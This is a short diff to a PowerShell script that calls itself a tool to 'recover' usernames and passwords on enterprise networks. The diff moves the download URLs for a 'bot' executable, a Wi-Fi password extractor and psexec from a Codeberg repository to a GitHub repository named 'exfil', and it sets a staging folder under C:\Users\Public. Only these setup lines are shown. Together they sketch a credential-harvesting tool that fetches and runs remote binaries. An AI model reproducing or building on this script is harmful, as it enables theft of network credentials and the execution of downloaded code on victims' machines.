@@ -1,7 +1,7 @@
 #Fully Functional script to recover Usernames and Passwords for Enterprice Networks.
-$boturl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/Registry.exe"
-$extractorurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/EnterpriseWifiPasswordRecover.exe"
-$psexecurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/psexec.exe"
+$boturl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/Registry.exe"
+$extractorurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/EnterpriseWifiPasswordRecover.exe"
+$psexecurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/psexec.exe"
 $basepath = "C:\Users\Public\Workdir"
 $profilesFolderPath = Join-Path -Path $basepath -ChildPath "profiles"
 $extractorexe = Join-Path -Path $basepath -ChildPath "EnterpriseWifiPasswordRecover.exe"
